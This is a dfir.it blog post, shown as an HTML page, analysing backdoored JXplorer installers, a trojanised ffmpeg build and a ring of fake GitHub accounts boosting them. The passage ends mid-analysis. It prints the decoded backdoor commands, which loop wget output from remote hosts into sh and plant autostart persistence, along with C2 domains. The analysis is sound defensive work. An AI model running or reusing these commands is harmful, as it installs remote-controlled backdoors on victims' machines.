@@ -1,0 +1,606 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>The Supreme Backdoor Factory - dfir it!</title>
+  <meta name="author" content="dfir.it!">
+
+  
+  <meta name="description" content="Recently I was playing with VirusTotal Intelligence and while testing some dynamic behavior queries I stumbled upon this strange PE binary (MD5: &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="https://dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="dfir it!" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-64331040-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">dfir it!</a></h1>
+  
+    <h2>responding to incidents with candied bacon</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="dfir.it" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">The Supreme Backdoor Factory</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2019-02-26T17:53:15+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2019</span></span> <span class='time'>5:53 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Recently I was playing with <a href="https://www.virustotal.com/intelligence/">VirusTotal Intelligence</a> and while testing some dynamic behavior queries I stumbled upon <a href="https://www.virustotal.com/#/file/5e3bba9a94ff757400ce5a0f2a2a43076c515bc0e3728964b4f58f503ed9917c">this strange PE binary</a> (MD5: <code>7fce12d2cc785f7066f86314836c95ec</code>). The file claimed to be an installer for the JXplorer 3.3.1.2, a Java-based &ldquo;cross platform LDAP browser and editor&rdquo; as indicated on its <a href="http://jxplorer.org/">official web page</a>. Why was it strange? Mostly because I did not expect an installer for a quite popular LDAP browser to create a scheduled task in order to download and execute PowerShell code from a subdomain hosted by free dynamic DNS provider:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/virustotal_jxplorer.png" title="VirusTotal - JXplorer" alt="VirusTotal - JXplorer"></p>
+
+<p>I initially planned to keep this write-up short and focus on dissecting suspicious JXplorer binary. However, analyzing the JXplorer binary turned out to be only the first step into the world of backdoored software.</p>
+
+<!--more-->
+
+
+<h3>JXplorer</h3>
+
+<p>In order to validate my VirusTotal finding I downloaded a matching version of Windows installer (3.3.1.2) from the official <a href="https://sourceforge.net/projects/jxplorer/files/jxplorer/version%203.3.1.2/">JXplorer SourceForge repository</a>. Unsurprisingly, the MD5 hashes of both files were different. Last thing I wanted to do was to disassemble two 7 megabytes PE binaries so I started with simpler checks in order to locate difference(s). As binaries were packed with UPX, I unpacked them with the <code>upx</code> tool and compared MD5s of PE sections. The sections were all identical, with exception of the resource section. I was not sure how content of the PE resource section could affect behavior of the installer so I used <a href="https://www.cjmweb.net/vbindiff/">VBinDiff</a> to see the exact difference. The tool actually revealed the following modifications:</p>
+
+<ul>
+<li>The manifest file located in the resource section, specifically the <code>requestedExecutionLevel</code> property. The original file required Administrator privileges (<code>requireAdministrator</code>) while the modified was fine with running with caller&rsquo;s privilege level</li>
+<li>Additional newline character appended to the file - explaining 1 byte size difference between the files</li>
+<li>A relatively small (3230 bytes) blob of what seemed to be ZLIB compressed data at offset 0x4be095. Note the clear text file names just before the ZLIB header (<code>http-2.7.9.tm</code>, <code>platform-1.0.10.tm</code>):</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/vbindiff_jxplorer.png" title="VBinDiff - JXplorer" alt="VBinDiff - JXplorer"></p>
+
+<p>The first two differences did not seem to be important so I focused on the last one. The identified ZLIB data was placed in the PE file overlay space and I figured that it was likely part of an archive used by the installer to store JXplorer files. Fortunately, JXplorer web page mentioned that JXplorer was using the <a href="https://bitrock.com/">BitRock Install Builder</a> and after short search I managed to find the following Tcl unpacker for BitRock archives: <a href="https://github.com/greyltc/bitrock-unpacker">bitrock-unpacker</a>.</p>
+
+<p>Once I installed the <a href="https://www.activestate.com/products/activetcl/">ActiveTcl</a> and downloaded required <a href="https://chiselapp.com/user/aspect/repository/sdx/index">SDX</a> file I used the <code>bitrock-unpacker</code> script to unpack JXplorer installation files from both installers. Then I used the <a href="http://winmerge.org/">WinMerge</a> tool to compare resulting files and directories. To my surprise there were no differences which meant that JXplorer application files were left intact. That also meant that I needed to dig a bit further.</p>
+
+<p>After going through <code>bitrock-unpacker</code> code I noticed that it first mounted the <a href="https://equi4.com/metakit/">Metakit</a> database in order to extract installer files that were used to locate and extract the <a href="https://wiki.tcl-lang.org/page/cookfs">Cookfs</a> archive storing JXplorer files. Using existing <code>bitrock-unpacker</code> code I created <a href="https://gist.github.com/dfir-it/06f3baa4556bba6822998103db43bc74">this Tcl script</a> to dump all installer files from the Metakit database to disk. This time comparing BitRock installer files yielded interesting results.</p>
+
+<p>WinMerge showed one difference - a file named <code>http-2.7.9.tm</code>, located in the <code>\lib\tcl8\8.4\</code> directory.</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/winmerge_bitrock_files.png" title="WinMerge - BitRock installer files" alt="WinMerge - BitRock installer files"></p>
+
+<p>Despite having the same size and timestamps (<code>atime</code>, <code>ctime</code>, <code>mtime</code> as extracted from the Cookfs archive) the file <code>http-2.7.9.tm</code> (MD5: <code>f6648f7e7a4e688f0792ed5a88a843d9</code>, <a href="https://www.virustotal.com/#/file/f7069ea454fe6e15548ea2450b4f93d904928a0535bb21812885b244b5628926">VT</a>) extracted from the modified installer did not remind standard <code>http.tcl</code> module. Instead it contained exactly what I was looking for:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/winmerge_http-2.7.9.png" title="WinMerge - http-2.7.9.tm" alt="WinMerge - http-2.7.9.tm"></p>
+
+<p>Below is the summary of actions performed by the <code>http-2.7.9.tm</code> script:</p>
+
+<ul>
+<li>Create a scheduled task named <code>Notification Push</code> to download and execute PowerShell code from <code>hxxp://svf.duckdns[.]org</code></li>
+<li>Write a JAR file (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>, <a href="https://www.virustotal.com/#/file/955904c82e953113183aad6a60fef962847549d02f531a62bf00d724c3c482c3">VT</a>) to <code>%TEMP%\..\Microsoft\ExplorerSync.db</code>. Create a scheduled task <code>ExplorerSync</code> to execute <code>ExplorerSync.db</code></li>
+<li>Write a JAR file (MD5: <code>533ac97f44b4aea1a35481d963cc9106</code>, <a href="https://www.virustotal.com/#/file/536eb0c00f1d4a39ddf9a2eca508897eb2064b4e28e25a3327626b53bad0319d">VT</a>) to <code>%TEMP%\BK.jar</code> and execute it with the following command line parameters: <code>hxxp://coppingfun[.]ml/blazebot</code> <code>%USERPROFILE%\Desktop\sup-bot.jar</code></li>
+<li>Execute additional JAR file downloaded in the previous step</li>
+<li>ping a legitimate domain <code>supremenewyork[.]com</code></li>
+</ul>
+
+
+<p>Some of the actions were a bit odd to me (Why would you drop malware(?) to user&rsquo;s Desktop? Why would you choose that specific domain <code>supremenewyork[.]com</code>?). That got me thinking that I might be dealing with a testing version of modified installer. The names of files (<code>blazebot</code>, <code>sup-bot</code>) did not ring any bells either so I decided to do a bit of online research.</p>
+
+<h3>Blazebot</h3>
+
+<p>One of the top Google search results for the keyword <code>blazebot</code> was this <a href="https://www.youtube.com/watch?v=XewdaL3UuEw">YouTube video</a> created by <a href="https://www.youtube.com/channel/UCiNWIOMXfaG3X1SjAWa34Ag">Stein SÃ¸rnson</a> and titled <code>Blaze Bot Supreme NYC</code>. The video presented a process of downloading, running and configuring what seemed to be a Java-based <a href="https://motherboard.vice.com/en_us/article/d33vpq/inside-the-wild-world-of-sneaker-buying-bots">sneaker bot</a> (TIL!) called <code>blazebot</code> / <code>Supreme NYC Blaze Bot</code>. Both the YouTube video content and its description referenced a source from which one can download blazebot: a GitHub repository <a href="https://github.com/steisn/blazebot">steisn/blazebot</a> [<a href="https://web.archive.org/web/20190221210816/https://github.com/steisn/blazebot">Wayback Machine copy</a>]. Git commit messages for that repository contained following author entries: <code>Stein SÃ¸rnson &lt;ed.fishman392@mail[.]ru&gt;</code> (<a href="https://github.com/steisn/blazebot/commit/2887b2ea484e17161dc714c023da4be942a2a516.patch">sample commit message</a>) suggesting that Stein SÃ¸rnson was the owner of both YouTube channel and GitHub repository.</p>
+
+<p>With such unique name it was not hard to find another online account related to Stein SÃ¸rnson, this time on <a href="https://sourceforge.net/u/allare778/profile/">SourceForge - allare778</a> [<a href="https://web.archive.org/web/20190221210947/https://sourceforge.net/u/allare778/profile/">Wayback Machine</a>]. While the username was set to <code>allare778</code> the full name was present in the profile page title:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/sourceforge_allare778.png" title="SourceForge - allare778 profile" alt="SourceForge - allare778 profile"></p>
+
+<p>The <code>allare778</code> account owned three projects:</p>
+
+<ul>
+<li><a href="https://sourceforge.net/projects/supremebot/">supremebot</a> [<a href="https://web.archive.org/web/20190221211026/https://sourceforge.net/projects/supremebot/">Wayback Machine copy</a>], which referenced previously discussed YouTube video and hosted multiple files, including <code>supremebot.jar</code> (MD5: <code>2098d71cd1504c8be229f1f8feaa878b</code>, <a href="https://www.virustotal.com/#/file/b2e5dd0ce1e2735e14f817c19613d156cafeddce10d294fb84f9016cc3f8304e">VT</a>), exactly the same file that was also present in the <a href="https://github.com/steisn/blazebot">blazebot</a> GitHub repository (as <a href="https://github.com/steisn/blazebot/blob/2887b2ea484e17161dc714c023da4be942a2a516/blazebot-1.02.11.jar"><code>blazebot-1.02.11.jar</code></a>)</li>
+<li><a href="https://sourceforge.net/projects/elitesubot/">elitesubot</a> [<a href="https://web.archive.org/web/20190221211100/https://sourceforge.net/projects/elitesubot/">Wayback Machine copy</a>], which was empty and did not list any past activity</li>
+<li><a href="https://sourceforge.net/projects/allesare/">allesare</a> [<a href="https://web.archive.org/web/20190223141233/https://sourceforge.net/p/allesare/activity/pjax?page=1&amp;limit=100">Wayback Machine copy</a>], which also did not contain any files; however, it listed project activity, including names of previously uploaded files:</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/sourceforge_allesare_project.png" title="SourceForge - allesare project" alt="SourceForge - allesare project"></p>
+
+<p>There was also one additional detail concerning blazebot that started to make sense to me much later. While back then I did not have many reasons to analyze that sneaker bot I took a quick look at decompiled Java classes. The bot contained an update functionality that downloaded AES encrypted and RSA signed &ldquo;update instructions&rdquo; file from the other project repository belonging to the user <code>allare778</code>:</p>
+
+<p><code>hxxp://allesare.sourceforge[.]net/en-us/bver</code></p>
+
+<p>The implementation of update mechanism seemed to allow project owner to execute arbitrary system commands on hosts running blazebot.</p>
+
+<p>At that point I thought that the connection between modified JXplorer installer and the &ldquo;Supreme NYC Blaze Bot&rdquo; could be just coincidental. I took a step back and analyzed two JAR files extracted from the <code>http-2.7.9.tm</code> Tcl script hoping that they will provide further clues.</p>
+
+<h3>JDL and FEN</h3>
+
+<p>This was a quick exercise as both JAR files turned out to contain compact downloaders/loaders. The <code>BK.jar</code> file (MD5: <code>533ac97f44b4aea1a35481d963cc9106</code>, <a href="https://www.virustotal.com/#/file/536eb0c00f1d4a39ddf9a2eca508897eb2064b4e28e25a3327626b53bad0319d">VT</a>) contained the <code>jdl</code> package implementing simple downloader. It was responsible for downloading data from URL provided as a first command line argument and then saving it to a file provided as a second command line argument.</p>
+
+<p>The second JAR file <code>ExplorerSync.db</code> (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>, <a href="https://www.virustotal.com/#/file/955904c82e953113183aad6a60fef962847549d02f531a62bf00d724c3c482c3">VT</a>) was more interesting as it contained two hardcoded URLs. The <code>fen</code> package implemented an infinite loop trying to download and invoke Java code (from the <code>fmb</code> package) from the following two URLs:</p>
+
+<ul>
+<li><code>hxxp://ecc.freeddns[.]org/data.txt</code></li>
+<li><code>hxxp://san.strangled[.]net/stat</code></li>
+</ul>
+
+
+<p>While the <code>san.strangled[.]net</code> did not have resolution at the time of analysis, the <code>ecc.freeddns[.]org</code> DNS A record pointed to <code>207.38.69[.]206</code>, an IP address hosting <a href="https://www.dynu.com/">Dynu&rsquo;s</a> web redirect service. The <code>ecc.freeddns[.]org</code> was set to redirect HTTP requests to <code>jessicacheshire.users.sourceforge[.]net</code> and fortunately the <code>data.txt</code> file was still present there.</p>
+
+<h3>FEimea Portable App</h3>
+
+<p>As expected the <code>data.txt</code> (MD5: <code>65579b8ed47ca163fae2b3dffd8b4d5a</code>, <a href="https://www.virustotal.com/#/file/86a3802ad5f35262d01efe6b678585db356121807bc28105f43019cbbd0f23fb">VT</a>) was a yet another JAR file. Going through decompiled code it was quite evident that code implemented functionality typical for a RAT. This is by no means a complete analysis of the code (there is much more ahead of us!) but I made following observations while skimming through the code:</p>
+
+<ul>
+<li>The tool identified itself as <code>FEimea Portable App - ver. 3.11.2  Mainline</code>. It also returned following version strings: <code>Audio system : (none)</code>, <code>Audio codecs : (none)</code> while it did not seem to implement any audio related functionality</li>
+<li>It supported following set of commands: ACCESS, APPEND, BYE, COPY, DOWNLOAD, FETCH, HASH, LIST, LOGOUT, NOOP, PWD, REMOVE, RENAME, SELECT, STAT, VERSION</li>
+<li>It seemed to use embedded RSA modulus and public exponent to encrypt and decrypt network communication with two hardcoded command and control servers: <code>limons.duckdns[.]org</code> (TCP/13057) and <code>polarbear.freeddns[.]org</code> (TCP/7003)</li>
+<li>Additionally it reported ROT13 encoded username, operating system type and architecture to the following URL: <code>hxxp://utelemetrics.atwebpages[.]com/update.php?tag=&lt;ROT13_DATA&gt;</code></li>
+<li>It also had capability of invoking Java code obtained from the hardcoded URL: <code>hxxp://ecc.freeddns[.]org/a2s.txt</code> (not available at the time of analysis)</li>
+<li>Interestingly it also implemented a very specific function to extract user name value from the <code>.gitconfig</code> file located in user&rsquo;s home directory</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/jdgui_feimea.png" title="JdGui - FEimea Portable App" alt="JdGui - FEimea Portable App"></p>
+
+<p>At that point I ran out of files to analyze but at the same time suspected that with the existence of the FEimea Portable App there is likely much more to this story than just someone playing with the JXplorer installer. I made an assumption that while I might have stumbled upon a testing version of the modified installer there might be other versions floating around. I also expected that some distribution channel for modified installer must exist.</p>
+
+<h3>JXplorer: Part Deux</h3>
+
+<p>I set out for a hunt. I downloaded latest Windows version (3.3.1.2) of the JXplorer installer from its official website and I compared MD5 hash with installer file hosted on the official GitHub repository <a href="https://github.com/pegacat/jxplorer/releases">pegacat/jxplorer</a>. They were the same (MD5: <code>c23a27b06281cfa93641fdbb611c33ff</code>). I did the same with JXplorer installer files downloaded from multiple software hosting websites. Same results. I repeated the process with files grabbed from SourceForge mirrors. All good. Then I searched for JXplorer on GitHub:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_jxplorer.png" title="GitHub - JXplorer" alt="GitHub - JXplorer"></p>
+
+<p>If not the number of stars assigned to the repositories I would probably have ignored the results. How come the official JXplorer GitHub repository (<a href="https://github.com/pegacat/jxplorer">pegacat/jxplorer</a>) had 39 stars while the next one (<a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> [<a href="https://web.archive.org/web/20190221204742/https://github.com/serkovs/jxplorer">Wayback Machine copy</a>]) had twice as many? The difference was even more striking with subscribers of each repository (11 vs 66). What was also strange the <a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> was not even a clone of the official JXplorer repository and it only contained a single file - Linux installer for the JXplorer 3.3.1.2:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_serkovs_jxplorer.png" title="GitHub - serkovs_jxplorer" alt="GitHub - serkovs_jxplorer"></p>
+
+<p>I downloaded Linux installer (32 bit ELF binary) from both repositories and compared the files. Just by looking and their sizes I knew they were different. The original Linux installer file <code>jxplorer-3.3.1.2-linux-installer.run</code> (MD5: <code>0c00fd22c65932ba9ce58b4ba6107cf0</code>, <a href="https://www.virustotal.com/#/file/7ff5ff0a124d8e16d7688ae093cfcd859f4be3104f3455cc59d4b15d55a61ffa">VT</a>) was 7679495 bytes long, while the one downloaded from <a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> (MD5: <code>0489493aeb26b6772bf3653aedf75d2a</code>, <a href="https://www.virustotal.com/#/file/21a5f6b003886b26c769132a8ffa06d607260980895a1e7484744fe3107ee099">VT</a>) was a bit larger (7954444 bytes).</p>
+
+<p>Both files were generated by BitRock Install Builder, the same tool that was used to create Windows version of the installer. I knew the drill and immediately used <code>bitrock-unpacker</code> to extract JXplorer software files and then compared them. There were no differences. Next I extracted BitRock installer files - again files were identical so I decided to further inspect the binary downloaded from the <a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> repository. While skimming through the binary in hex editor I noticed strings characteristic for the UPX packer however my attempt to unpack it with the <code>upx</code> tool was unsuccessful and I got the <code>not packed by UPX</code> error. After a while I realized that the file lacked usual UPX magic values (<code>UPX!</code>) which were replaced by the following string: <code>L1ma</code>. Fortunately <code>upx</code> was able to unpack the file after I replaced all occurrences of <code>L1ma</code> with the original value of <code>UPX!</code>.</p>
+
+<p>Once I had the unpacked file (MD5: <code>25c47cf531e913cb4a59b2237ab85963</code>, <a href="https://www.virustotal.com/#/file/c4790a8a728e7237a78aa040c3925e697800d5ffeccf1161d22b9fb9dd78a698">VT</a>) I spent some time reverse-engineering it and eventually I found a suspicious function that started with decrypting 704 bytes of data (located at file offset 0x92040) using 256 bytes long XOR key (located at file offset 0x66700).
+The decrypted data contained 15 null-terminated strings. The ultimate goal of the code was to establish persistence and to execute the following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c 'while true;do wget hxxp://yzyaio.onlinewebshop[.]net/act/stat.php?info=SLADE -O -|sh;sleep 60;done&gt;/dev/null 2&gt;&1'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The code followed two main paths, depending on privileges it was executed with. When ran with root privileges the code would perform following actions:</p>
+
+<ul>
+<li>Create a new systemd service <code>rpc-statd-sync</code> (with the following description: <code>Sync NFS peers due to a restart</code>) to execute above one-liner</li>
+<li>Establish additional persistence for every user in the system by creating a desktop entry (<code>~/.config/autostart/.desktop</code>) to execute above one-liner</li>
+</ul>
+
+
+<p>Without root privileges the code resorted only to infecting current user.</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/ida_jxplorer_linux.png" title="IDA - JXplorer backdoor code" alt="IDA - JXplorer backdoor code"></p>
+
+<p>While modified software was rather specific, at that stage I did not have any proof that the same entity was behind modification of both (Linux and Windows) JXplorer installers. I was also very curious what else I can find on GitHub.</p>
+
+<h3>The Power of Social Graph</h3>
+
+<p>I started going through GitHub accounts that starred or subscribed the repository <a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> and I quickly noticed patterns:</p>
+
+<ul>
+<li>Accounts seemed to be created in multiple batches, on specific dates, as if the process was automated</li>
+<li>Accounts created on 2018-03-04 did not have any content and were simply used to star 41 other repositories</li>
+<li>Accounts created at earlier dates (February 2018) were used both to host a single repository and to increase authenticity of other repositories by starring and subscribing them</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_serkovs_jxplorer_stargazers.png" title="GitHub - serkovs_jxplorer stargazers" alt="GitHub - serkovs_jxplorer stargazers"></p>
+
+<p>There were additional similarities among accounts that hosted repositories:</p>
+
+<ul>
+<li>Each account hosted a single repository with a history of one or two commits</li>
+<li>The author field in the Git commit messages indicated consistent usage of free Slovakian email service <code>pobox[.]sk</code> , with username often corresponding to the one used on GitHub (<a href="https://github.com/serkovs/jxplorer/commit/4d8a7dafcd32c1ef219b458700fb0206f6354232.patch">sample commit message</a>)</li>
+<li>Timestamps present in the Git commit messages consistently indicated CET time zone</li>
+<li>Commit messages tended to be consistent among different accounts and repositories, e.g. erroneous message &ldquo;2st commit&rdquo; appeared in different repositories belonging to different accounts: <a href="https://github.com/aurelrybar/editbox">aurelrybar/editbox</a> [<a href="https://web.archive.org/web/20190221205302/https://github.com/aurelrybar/editbox/">Wayback Machine copy</a>], <a href="https://github.com/henrichjahoda/ardublock">henrichjahoda/ardublock</a> [<a href="https://web.archive.org/web/20190221205513/https://github.com/henrichjahoda/ardublock">Wayback Machine copy</a>]</li>
+<li>Commits seemed to be automated and occurred at specific times among different accounts and repositories, e.g. <a href="https://github.com/gabrieolo/bounceball">gabrieolo/bounceball (2018-04-28 11:11:17)</a>, <a href="https://github.com/karibanker/eug">karibanker/eug (2018-04-28 11:11:18)</a>, <a href="https://github.com/jeanelletobler/gumbo">jeanelletobler/gumbo (2018-04-28 11:11:19)</a></li>
+<li>Most repositories hosted a single JAR file, usually a game (<a href="https://github.com/gabrieolo/bounceball">gabrieolo/bounceball</a> [<a href="https://web.archive.org/web/20190221210327/https://github.com/gabrieolo/bounceball">Wayback Machine copy</a>]), tool (<a href="https://github.com/jelamarucka/pdfjumbler">jelamarucka/pdfjumbler</a> <a href="https://web.archive.org/web/20190221204623/https://github.com/jelamarucka/pdfjumbler">[Wayback Machine copy]</a>) or library (<a href="https://github.com/vaclaw281/junit">vaclaw281/junit</a> [<a href="https://web.archive.org/web/20190221204756/https://github.com/vaclaw281/junit">Wayback Machine copy</a>])</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_gabrieolo.png" title="GitHub - gabrieolo_bounceball commit" alt="GitHub - gabrieolo_bounceball commit"></p>
+
+<p>I eventually ended up using GitHub API and Neo4j to collect and analyze metadata associated with suspicious accounts and repositories. Data showed nothing but a confined network of GitHub accounts starring and subscribing each others&#8217; repositories.</p>
+
+<p>As I was limited with time and resources and was not able to analyze each file in each identified repository I resorted to analyzing only a small subset of files. Two of the repositories turned out to contain interesting artifacts that allowed me to draw additional connections and fill existing gaps. Below graph shows &ldquo;social interactions&rdquo; between the <a href="https://github.com/serkovs/">serkovs</a> account, two other accounts that I analyzed (<a href="https://github.com/mansiiqkal/">mansiiqkal</a> and <a href="https://github.com/ballory/">ballory</a>) and a number of related (starred/subscribed) repositories:</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/social_graph.svg" title="Neo4j - Social Graph" alt="Neo4j - Social Graph"></p>
+
+<h3>The Missing Link</h3>
+
+<p>I decided to inspect content of the <a href="https://github.com/ballory/ffmpeg">ballory/ffmpeg</a> [<a href="https://web.archive.org/web/20190221210350/https://github.com/ballory/ffmpeg">Wayback Machine copy</a>] repository because it did not contain JAR file(s) like most of other identified repositories - instead it had a bunch of Linux binaries, claiming to contain &ldquo;FFmpeg Linux Build (64 bit)&rdquo;. Additionally, the repository stood out as it did not have as many stars and subscribers as others (only 14) however the owner (<code>ballory</code>) starred and subscribed at least 60 other repositories according to the collected data.</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_ballory.png" title="GitHub - ballory_ffmpeg" alt="GitHub - ballory_ffmpeg"></p>
+
+<p>The <code>readme.txt</code> file present in the repository directly linked to <a href="https://www.johnvansickle.com/ffmpeg/">www.johnvansickle.com/ffmpeg/</a>, a website hosting static ffmpeg builds for Linux. In fact, file names and directory structure matched <a href="https://johnvansickle.com/ffmpeg/builds/ffmpeg-git-amd64-static.tar.xz">sample build</a> I downloaded from there. I did not find that exact build (<code>ffmpeg-git-20180427-64bit-static.tar.xz</code> listed in the <code>readme.txt</code> file) on <a href="https://www.johnvansickle.com">www.johnvansickle.com</a> so I was not able to compare files.</p>
+
+<p>When I started analyzing the <code>ffmpeg</code> 64 bit ELF binary (MD5: <code>c78ccfc45bfba703cce0fc0c75c0f6af</code>, <a href="https://www.virustotal.com/#/file/2859b86854018bb4db2226e1ff14a4de4aa0187cd563c705d4ae1dbda0c07086">VT</a>) I immediately noticed suspicious code right at the entry point. The code was responsible for mapping the binary via <code>/proc/self/exe</code> and then jumping to a specific offset, 624 bytes from the end of the file. After dumping and disassembling shellcode occupying last 624 bytes of the binary I was left with a short decryption loop (XOR 0x37, SUB 0x2e) and encrypted data. The decrypted data contained shellcode responsible for forking and executing following command in the child process via <code>execve</code> syscall:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c 'cd /home/`whoami`/.config&&mkdir -p autostart&&cd autostart&&echo [Desktop Entry]&gt;y&&echo Type=Application&gt;&gt;y&&echo Exec=/bin/sh -c "'while true;do wget hxxp://allesare.sourceforge[.]net/en-us/m -O -|sh;sleep 60;done'"&gt;&gt;y&&chmod 755 y&&mv y .desktop'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That was exactly what I was looking for. The <code>allesare</code> SourceForge project was owned by the account named <code>allare778</code> (Stein SÃ¸rnson), and this finding created plausible link between the GitHub user <code>ballory</code> and that account.</p>
+
+<p>Remaining part of the code was supposed to run in the parent process and was responsible for decrypting (XOR 0x11, SUB 0x31) 162 bytes of data located 786 bytes from the end of the file and jumping to it. The decrypted data seemed to contain original entry point function.</p>
+
+<p>The other analyzed binaries from the repository (<code>ffmpeg-10bit</code> (MD5: <code>6d5bea9bfe014fc737977e006692ebf3</code>, <a href="https://www.virustotal.com/#/file/28af5641501fccc2f4f500b822fabdd20b0081f0d549995de3e250b70dc906da">VT</a>), <code>ffprobe</code> (MD5: <code>98f8600ff072625fd8ff6b3e14675648</code>, <a href="https://www.virustotal.com/#/file/66c0800bf203cdb5852de240963fd94ac8f2f8262546aa3f021d989ff4a1d28b">VT</a>), <code>qt-faststart</code> (MD5: <code>e9b58b1e173734b836ed4b74184c320b</code>, <a href="https://www.virustotal.com/#/file/905057c8b188f05223aab68d59addf2f61fc5611e0322852210b91e4fcade738">VT</a>)) contained same pieces of shellcode, located at the same offsets from the end of files and used the same decryption routines. The only small differences were in the hardcoded offsets.</p>
+
+<h3>The Even More Missing Link</h3>
+
+<p>The second repository that yielded interesting results was <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java">mansiiqkal/easymodbustcp-udp-java</a> [<a href="https://web.archive.org/web/20190221205352/https://github.com/mansiiqkal/easymodbustcp-udp-java">Wayback Machine copy</a>]. The repository was starred and subscribed by both <a href="https://github.com/serkovs/">serkovs</a> and <a href="https://github.com/ballory/">ballory</a> accounts. The description (<code>Easy Modbus TCP/UDP/RTU</code>) and the file name (<code>EasyModbusJava.jar</code>) suggested that it contained the <a href="http://easymodbustcp.net/en/">EasyModbus Java library</a>.</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_mansiiqkal.png" title="GitHub - mansiiqkal_easymodbustcp-udp-java" alt="GitHub - mansiiqkal_easymodbustcp-udp-java"></p>
+
+<p>I downloaded the most recent version (2.8, released on 2017-03-14) of <code>EasyModbusJava.jar</code> (MD5: <code>56668c3915a0aa621d7f07aa11f7c8a9</code>, <a href="https://www.virustotal.com/#/file/466d1533a1bdd67b126b992a00820cdaa5e8608cf7567f410a328d5c879a4201">VT</a>) from the official EasyModbus <a href="https://sourceforge.net/projects/easymodbustcp-udp-java/files/V2.8/">project page</a> and compared it with <code>EasyModbusJava.jar</code> (MD5: <code>4d18388a9b351907be4a9f91785c9997</code>, <a href="https://www.virustotal.com/#/file/d1b19801e477f6297e41bfa040f5fb09e5f34b1e24b2bd90c960dd09a2be85f9">VT</a>) from <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java/">mansiiqkal/easymodbustcp-udp-java</a>.</p>
+
